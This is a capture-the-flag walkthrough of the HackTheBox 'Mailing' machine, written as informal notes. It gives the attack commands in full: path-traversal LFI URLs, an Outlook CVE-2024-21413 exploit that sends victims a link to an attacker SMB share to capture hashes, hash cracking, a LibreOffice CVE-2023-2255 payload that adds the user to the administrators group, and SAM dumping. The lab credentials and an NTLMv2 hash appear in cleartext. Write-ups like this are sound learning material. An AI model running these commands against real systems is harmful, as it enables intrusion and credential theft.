**Ping**
![[Pasted image 20240710161640.png]]

Nmap Scans
```
mapit 10.10.11.14
```

Nmap Default Scan
![[Pasted image 20240710161716.png]]

Nmap Service and Script Scan
![[Pasted image 20240710162036.png]]
![[Pasted image 20240710162121.png]]

Nmap All Port Scan
![[Pasted image 20240710162629.png]]

Nmap Service and Script Scan
![[Pasted image 20240710162658.png]]

On Port 80 http://mailing.htb
![[Pasted image 20240710162539.png]]

Will Download the Instructions
![[Pasted image 20240710162752.png]]

Gobuster Scan
```
gobuster dir -u http://mailing.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,aspx -s 200,204,301,302,307,403 -k --status-codes "" -o gobuster.txt
```
![[Pasted image 20240710163944.png]]

I think download.php might vulnerable to LFI
![[Pasted image 20240710164057.png]]
Will specify a path to file

Yes, It's vulnerable to LFI
```
http://mailing.htb/download.php?file=../../../../../../../../../../windows/system.ini
```
![[Pasted image 20240710163850.png]]

Syystem.ini
![[Pasted image 20240710164218.png]]

Will get the .ini file of hmailserver
```
http://mailing.htb/download.php?file=../../../../../../../../Program%20Files%20(x86)/hMailServer/Bin/hMailServer.ini
```
![[Pasted image 20240710164448.png]]

hmailserver.ini
![[Pasted image 20240710164609.png]]
We got admin's and another user password hash

Administrator Password, cracked using crackstaion
![[Pasted image 20240710164829.png]]
**administrator:homenetworkingadministrator**
couldn't crack another hash, will move with this password

Nothing in his email account, used thunderbird
![[Pasted image 20240710165714.png]]

Found a vulnerability https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability?tab=readme-ov-file to capture the NTLM hash via mail

Will send mail to all three employee with the smb share link and will catch that with our responder
```
responder -I tun0
```
![[Pasted image 20240710165908.png]]

Will send mail using the exploit script
```
python3 exp.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.6\dnmap.txt" --subject "pwned"
```
![[Pasted image 20240710174820.png]]



Will Jump to Initial Foothold


Got NTLMV2 hash on Responder
```
maya::MAILING:95de498996a31a8c:D2BABC773FF653EE285D33E6FE5493A6:010100000000000080F2298488B6DA015D1DCBB264E2490C0000000002000800530059005500490001001E00570049004E002D005A004F0042005000340036004D0038004B005600410004003400570049004E002D005A004F0042005000340036004D0038004B00560041002E0053005900550049002E004C004F00430041004C000300140053005900550049002E004C004F00430041004C000500140053005900550049002E004C004F00430041004C000700080080F2298488B6DA0106000400020000000800300030000000000000000000000000200000C9E5BC0C7D84E948E12CF5D180E24C511C66B448EF8DB310790EDB6AD72669FF0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370031000000000000000000
```
![[Pasted image 20240710175032.png]]

Will crack this using John
```
john --wordlist=/usr/share/wordlists/rockyou.txt ntlmv2.hash
```
![[Pasted image 20240710175138.png]]
**maya:m4y4ngs4ri**

Got a shell as maya using Evil-Winrm
```
evil-winrm -i 10.10.11.14 -u maya -p "m4y4ngs4ri"
```
![[Pasted image 20240710175409.png]]

**User.txt**
![[Pasted image 20240710175535.png]]


Will Jump to Privilege Escalation....!


I can see LibreOffice in the Program files
![[Pasted image 20240710180334.png]]

It has version 7.4
![[Pasted image 20240710180733.png]]

Will Search exploit for this version https://github.com/elweth-sec/CVE-2023-2255
![[Pasted image 20240710180805.png]]

This exploit code will help us to create a .odt file which will run as admin

Will create one....!
```
python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'pwned.odt'
```
![[Pasted image 20240710182745.png]]

Will transfer it to target machine in the **directory C:\\Important files** and execute
```
./pwned.odt
```
![[Pasted image 20240710182945.png]]

We are admin now still don't have access to the local admin directory, will check our privilege 
Using crackmapexec and dump hash using -sam 
```
crackmapexec smb 10.10.11.14 -u maya -p "m4y4ngs4ri" --sam
```
![[Pasted image 20240710190539.png]]

we got localadmin ntlm hash, can use this and get session as localadmin

Also can use maya creds to get admin shell. because she is admin now
```
impacket-psexec  maya@10.10.11.14
```
![[Pasted image 20240710190742.png]]
![[Pasted image 20240710191042.png]]

Or Just close the current evil-winrm shell and open a new one
![[Pasted image 20240710190942.png]]
![[Pasted image 20240710191007.png]]


There are many ways to get root.txt since maya in Admin's group, but can't do anything in current evil-winrm shell, once you executed the .odt file just close the shell and open a new one with any of this method


Done with Mailing.....:)
